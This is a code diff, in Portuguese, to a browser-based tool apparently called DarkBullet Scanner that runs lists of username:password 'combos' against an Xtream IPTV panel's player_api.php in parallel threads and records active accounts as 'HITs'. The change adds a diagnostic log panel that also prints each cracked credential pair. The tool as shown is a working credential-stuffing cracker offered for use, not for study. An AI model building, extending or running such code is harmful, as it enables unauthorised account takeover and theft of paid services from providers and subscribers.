@@ -914,6 +914,15 @@
                     <label for="without-categories">Sem categorias</label>
                 </div>
             </div>
+
+            <div class="input-group">
+                <div class="checkbox-item" style="margin-bottom:8px;">
+                    <input type="checkbox" id="diagnostic-mode">
+                    <label for="diagnostic-mode">Modo Diagnóstico (mostrar motivos de falha)</label>
+                </div>
+                <textarea id="diagnostic-log" rows="6" style="width:100%;background:#0f1115;color:#9fe7ff;border:1px solid #333;padding:8px;font-family:Consolas,monospace;font-size:12px;resize:vertical;" placeholder="Logs de diagnóstico aparecerão aqui..." readonly></textarea>
+                <button id="copy-diagnostic" class="btn btn-secondary btn-block" style="margin-top:8px;">Copiar Diagnóstico</button>
+            </div>
             
             <div class="input-group">
                 <button id="start-btn" class="btn btn-success btn-block">INICIAR SCAN</button>
@@ -1082,6 +1091,8 @@
         let lastRequestTime = Date.now();
         let rpsInterval;
         let showCategories = true;
+        let diagnosticMode = false;
+        let diagnosticLogs = [];
         
         // Configuração da API Xtream
         const xtreamConfig = {
@@ -1130,6 +1141,9 @@
         const modalClose = document.getElementById('modal-close');
         const withCategories = document.getElementById('with-categories');
         const withoutCategories = document.getElementById('without-categories');
+        const diagnosticModeInput = document.getElementById('diagnostic-mode');
+        const diagnosticLogBox = document.getElementById('diagnostic-log');
+        const copyDiagnosticBtn = document.getElementById('copy-diagnostic');
         
         // Elementos do player
         const playerModal = document.getElementById('player-modal');
@@ -1151,6 +1165,11 @@
         modalClose.addEventListener('click', closeHelpModal);
         withCategories.addEventListener('change', updateCategoriesPreference);
         withoutCategories.addEventListener('change', updateCategoriesPreference);
+        diagnosticModeInput.addEventListener('change', () => {
+            diagnosticMode = diagnosticModeInput.checked;
+            logDebug(`Modo diagnóstico: ${diagnosticMode ? 'ATIVO' : 'INATIVO'}`);
+        });
+        copyDiagnosticBtn.addEventListener('click', copyDiagnosticLogs);
         
         // Event listeners do player
         playerClose.addEventListener('click', closePlayerModal);
@@ -1168,6 +1187,27 @@
         
         function updateCategoriesPreference() {
             showCategories = withCategories.checked;
+        }
+
+        function logDebug(message) {
+            if (!diagnosticMode && !message.startsWith('Modo diagnóstico')) return;
+            const line = `[${new Date().toLocaleTimeString()}] ${message}`;
+            diagnosticLogs.push(line);
+            if (diagnosticLogs.length > 500) {
+                diagnosticLogs = diagnosticLogs.slice(-500);
+            }
+            diagnosticLogBox.value = diagnosticLogs.join('\n');
+            diagnosticLogBox.scrollTop = diagnosticLogBox.scrollHeight;
+        }
+
+        function copyDiagnosticLogs() {
+            if (!diagnosticLogs.length) {
+                showNotification('Nenhum log de diagnóstico para copiar.', 'warning');
+                return;
+            }
+            navigator.clipboard.writeText(diagnosticLogs.join('\n'))
+                .then(() => showNotification('Diagnóstico copiado!', 'success'))
+                .catch(() => showNotification('Falha ao copiar diagnóstico.', 'error'));
         }
         
         function handleFileUpload(event) {
@@ -1208,6 +1248,10 @@
             startBtn.disabled = true;
             stopBtn.disabled = false;
             combosInput.disabled = true;
+
+            diagnosticLogs = [];
+            diagnosticLogBox.value = '';
+            logDebug(`Iniciando scan host=${host} combos=${combos.length}`);
             
             const threads = parseInt(threadsSelect.value);
             
@@ -1246,6 +1290,8 @@
             resultsList.innerHTML = '';
             filenameSpan.textContent = 'Nenhum arquivo selecionado';
             combosInput.value = '';
+            diagnosticLogs = [];
+            diagnosticLogBox.value = '';
             updateStats();
         }
         
@@ -1261,6 +1307,7 @@
             activeThreads++;
             const combo = combos[totalProcessed];
             totalProcessed++;
+            logDebug(`Processando combo ${totalProcessed}/${combos.length}: ${combo}`);
             
             try {
                 const result = await validarCombo(host, combo);
@@ -1270,10 +1317,14 @@
                     displayResult(result);
                     playSound('success');
                     showNotification('HIT encontrado!', 'success');
+                    logDebug(`HIT: ${result.user}:${result.pass} @ ${result.host}`);
+                } else {
+                    logDebug(`Sem hit: ${combo}`);
                 }
             } catch (error) {
                 errorsCount++;
                 console.error('Erro ao processar combo:', error);
+                logDebug(`Erro combo ${combo}: ${error?.message || error}`);
             } finally {
                 updateStats();
                 activeThreads--;
@@ -1285,7 +1336,10 @@
             lastRequestTime = Date.now();
             
             const [user, pass] = combo.split(':');
-            if (!user || !pass) return null;
+            if (!user || !pass) {
+                logDebug(`Combo inválido (formato): ${combo}`);
+                return null;
+            }
             
             // Ajuste host e porta
             let porta = "80";
@@ -1297,10 +1351,16 @@
             // Validação da combo
             const urlUserInfo = `http://${hostSemPorta}:${porta}/player_api.php?username=${user}&password=${pass}`;
             const resUserInfo = await fetchWithTimeout(urlUserInfo);
-            if (!resUserInfo.ok) return null;
+            if (!resUserInfo.ok) {
+                logDebug(`HTTP ${resUserInfo.status} em player_api para ${user}`);
+                return null;
+            }
             
             const dataUser = await resUserInfo.json();
-            if (!(dataUser.user_info && dataUser.user_info.status && dataUser.user_info.status.toLowerCase() === 'active')) return null;
+            if (!(dataUser.user_info && dataUser.user_info.status && dataUser.user_info.status.toLowerCase() === 'active')) {
+                logDebug(`Usuário inativo/invalidado: ${user}`);
+                return null;
+            }
             
             const info = dataUser.user_info;
             
@@ -1380,6 +1440,7 @@
                 
                 const timer = setTimeout(() => {
                     controller.abort();
+                    logDebug(`Timeout ${timeout}ms: ${url}`);
                     reject(new Error('Timeout'));
                 }, timeout);
                 
@@ -1390,6 +1451,7 @@
                     })
                     .catch(err => {
                         clearTimeout(timer);
+                        logDebug(`Falha de rede: ${url} => ${err?.message || err}`);
                         reject(err);
                     });
             });
@@ -1721,6 +1783,7 @@ DarkBullet Scanner`;
             stopBtn.disabled = true;
             combosInput.disabled = false;
             clearInterval(rpsInterval);
+            logDebug(`Scan finalizado. hits=${hitsCount} erros=${errorsCount} processados=${totalProcessed}`);
             
             if (!stopRequested) {
                 showNotification('Scan completo!', 'success');
